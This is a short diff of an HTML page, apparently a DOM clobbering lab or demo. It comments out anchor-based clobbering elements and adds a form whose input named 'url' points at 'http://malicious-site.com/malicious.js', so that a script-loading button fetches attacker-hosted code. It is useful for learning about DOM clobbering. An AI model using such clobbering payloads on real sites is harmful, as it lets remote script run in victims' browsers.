@@ -5,9 +5,13 @@
 </head>
 <body>
     /////clobbering payload/////
-    <a id="hello"><\a>
-    <a id="hello" name=url href="https://gaeunbae.github.io/alert.js"></a>
+<!--     <a id="hello"><\a>
+    <a id="hello" name=url href="https://gaeunbae.github.io/alert.js"></a> -->
     ///////////////////////////
+    <form id="hello">
+        <input name="url" value="http://malicious-site.com/malicious.js">
+    </form>
+
     <form id="script-form">
         <button type="button" onclick="makeScript()">Make Script!</button>
     </form>    
